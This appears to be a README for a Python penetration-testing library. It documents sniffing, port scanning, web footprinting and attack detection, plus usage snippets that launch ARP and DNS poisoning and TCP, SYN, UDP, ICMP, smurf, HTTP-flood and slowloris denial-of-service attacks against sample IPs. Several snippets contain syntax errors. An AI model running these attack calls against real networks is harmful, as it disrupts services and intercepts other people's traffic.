# Pentest
A cybersecurity ethical hacking library containing penetration testing tools such as network scanners, sniffer, DoS/DDoS and Man-in-the-middle attacks.

## Tools
* Sniffer ([Packet analyzer](https://en.wikipedia.org/wiki/Packet_analyzer))
* [Port scanner](https://en.wikipedia.org/wiki/Port_scanner)
* [Ping sweeper](https://en.wikipedia.org/wiki/Ping_sweep)
* [Web footprinting](https://en.wikipedia.org/wiki/Footprinting)
* [Man-in-the-middle](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)
  * [ARP spoofing](https://en.wikipedia.org/wiki/ARP_spoofing)
  * [DNS spoofing](https://en.wikipedia.org/wiki/DNS_spoofing)
* [Denial-of-service and distributed denial-of-service](https://en.wikipedia.org/wiki/Denial-of-service_attack)
  * TCP flood
  * [SYN flood](https://en.wikipedia.org/wiki/SYN_flood)
  * [UDP flood](https://en.wikipedia.org/wiki/UDP_flood_attack)
  * [Ping of death](https://en.wikipedia.org/wiki/Ping_of_death)
  * [Smurf attack](https://en.wikipedia.org/wiki/Smurf_attack)
  * [HTTP Flood](https://en.wikipedia.org/wiki/HTTP_Flood)
  * [Slowloris](https://en.wikipedia.org/wiki/Slowloris_(computer_security))
### Network scanner
#### Sniffer
Sniffes packets traffic on the local machine
```Python
from scan.monitor import Sniffer

sniffer = Sniffer()
# run sniffer
sniffer.start()
# stop sniffer
sniffer.stop()
```
The default packet handler simply prints each packet. You create a costum handler and handle each packet in any way you want.
```Python
def packet_handler(packet):
  # handle packet code
  
sniffer.start(packet_handler)
```

Add filters
```Python
# add source ip
sniffer.filters.src_ip.add('254.235.15.107')
# add list of source ip's
sniffer.filters.src_ip.add_list(['254.235.15.107', '156.185.129.18', '63.205.102.187'])
# remove filter
sniffer.filters.src_ip.remove('156.185.129.18')
# reset filter
sniffer.filters.src_ip.reset()
# reset all filters
sniffer.filters.reset()

# available filters
sniffer.filters.src_ip # source ip
sniffer.filters.dest_ip # destination ip
sniffer.filters.src_mac # source MAC address
sniffer.filters.dest_mac # destination MAC address
sniffer.filters.protocol # layer protocol
```

#### Port scanning
Scan network for open ports per given protocol (TCP/UDP)
```Python
import scan.portscan import PortScanner

network_ip = ""
scanner = PortScanner(network_ip)
# scan single port. returns true/false
import scan.portscan import TCP
port = 62300
scanner.scan_port(TCP, port)
# scan a range of ports. returns a list containing the results
# default range is 0 to 65535 if no range is provided
ports = (40000, 55000).
# set output as true to display the results while scanning
results = scanner.scanport(TCP, ports, output=true)
```
#### Ping sweep
Detection of other available machines on a network
```Python
import scan.pingsweep import PingSweep

scanner = PingSweep(target_network_ip)
# scans single ip address
scanner.ping_ip(target_ip) # returns True/False
# receives a range of ip addresses on the network and returns a list of the active addresses
ip_addresses = scanner.ping_sweep((1,255))
```
#### Website Footprinting
Perform tests on HTTP servers by analyzing the responses.
```Python
from scan import webfp
url = www.google.com
```
HTTP methods scan. Returns a list which contains a response for each request
```Python
webfp.check_http_methods(url)
# output
[('GET', 200, 'OK'), ('POST', 405, 'Method Not Allowed'), ('PUT', 405, 'Method Not Allowed'), ('DELETE', 405, 'Method Not Allowed'), ('OPTIONS', 405, 'Method Not Allowed'), ('TEST', 405, 'Method Not Allowed'), ('TRACE', 405, 'Method Not Allowed')]
```
HTTP headers scan
```Python
webfp.check_http_headers(url)
# output
[('Server', 'gws'), ('Date', 'Sun, 10 Jan 2021 19:29:10 GMT'), ('Via', 'No details'), ('X-Powered-By', 'No details'), ('X-Country-Code', 'No details'), ('Connection', 'No details'), ('Content-Length', '6215')]
```
HTTP security headers scan
```Python
webfp.check_http_headers(url, None)
# output
[('Strict-Transport-Security', 'Not set'), ('Content-Security-Policy', 'Not set'), ('X-Content-Type-Options', 'Not set'), ('X-Frame-Options', 'SAMEORIGIN'), ('X-Permitted-Cross-Domain-Policies', 'Not set'), ('X-XSS-Protection', '0'), ('Public-Key-Pins', 'Not set')]
```
HTTP banner grabing
```Python
webfp.grab_banner(url, 80)
# output 
b'HTTP/1.0 404 Not Found\r\nContent-Type: text/html; charset=UTF-8\r\nReferrer-Policy: no-referrer\r\nContent-Length: 1564\r\nDate: Sun, 10 Jan 2021 19:31:47 GMT\r\n\r\n<!DOCTYPE html>\n<html lang=en>\n  <meta charset=utf-8>\n  <meta name=viewport content="initial-scale=1, minimum-scale=1, width=device-width">\n  <title>Error 404 (Not Found)!!1</title>\n  <style>\n    *{margin:0;padding:0}html,code{font:15px/22px arial,sans-serif}html{background:#fff;color:#222;padding:15px}body{margin:7% auto 0;max-width:390px;min-height:180px;padding:30px 0 15px}* > body{background:url(//www.google.com/images/errors/robot.png) 100% 5px no-repeat;padding-right:205px}p{margin:11px 0 22px;overflow:hidden}ins{color:#777;text-decoration:none}a img{border:0}@media screen and (max-width:772px){body{background:none;margin-top:0;max-width:none;padding-right:0}}#logo{background:url(//www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png) no-repeat;margin-left:-5px}@media only screen and (min-resolution:192dpi){#logo{background:url(/'
```
#### Other scans
```Python
from scan import detect

# an attempt to detect a DoS attack by detecting exceptional occurrences of IP addresses
# accepts number of occurences limit condiiton of ip address and scan timeout in seconds
exceptions = detect.detect_exceptional_ip(15, 1)

# an attempt to detect ARP spoofing attack by scanning Ip and MAC addresses duplications in ARP cache table
# receives an ARP table or leave enpty for local table
suspects =  detect.scan_arp_table()
```

### Man in the middle (MITM)
#### ARP poisioning
Set gateway, victim and attacker MAC and IP addresses.
```Python
gateway= ('c91f05bc4c59', '93.120.174.77')
victim= ('7aab539606eb', '58.88.156.2')
attacker= ('50676bbcc76a', '132.39.100.142')
```
Execute attack.
```Python
from attack.mitm import ARPAttack

arp_attack = ARPAttack(gateway, victim, attacker)
# run attack
arp_attack.start_poisoning()
# stop attack
attack.stop_poisoning()
```
If the attack is successful, you will be able to capture packets traffic between the victim and the gateway.

#### DNS Poisoning
```Python
from attack.mitm import dns_poisoning
# receives target DNS server, original domain name, forged address and DNS query id numbers list
# the id numbers are required to forward a forged DNS answer to the target server
dns_poisoning(TARGET_SERVER, DOMAIN_NAME, FORGED_IP_ADDRESS, ID_LIST)
```
### Denial of Service (DoS and DDoS)
##### TCP and UDP attacks
```Python
from attack import dos

target_ip = '132.39.100.142'
port = "55400"
# timeout in seconds
timeout = 60

# TCP flood attack
dos.tcp_flood_attack(target_ip, port, timeout)

# TCP SYN attack
dos.syn_flood_attack(target_ip, port, timeout)

# UDP flood attack
dos.udp_flood_attack(target_ip, port, timeout)
```
#### ICMP (Ping) attacks
```Python
from attack import dos

target_ip = '132.39.100.142'
# timeout in seconds
timeout = 60
# use threading for faster performance
use_thread = True

# ping of death attack
dos.ping_of_death(target_ip, use_thread, timeout)

# DDoS smurf attack
dos.smurf_attack(target_ip, timeout)
```
#### HTTP attacks
```Python
from attack import dos

target_ip = '132.39.100.142'
# timeout in seconds
timeout = 60
port = 80
# number of requests to flood
requests = 100

# HTTP flood attack
dos.http_flood_attack(target_ip, port, requests, timeout)

# slowloris attack
dos.slowloris_attack(target_ip, port, requests, timeout)
```

### App

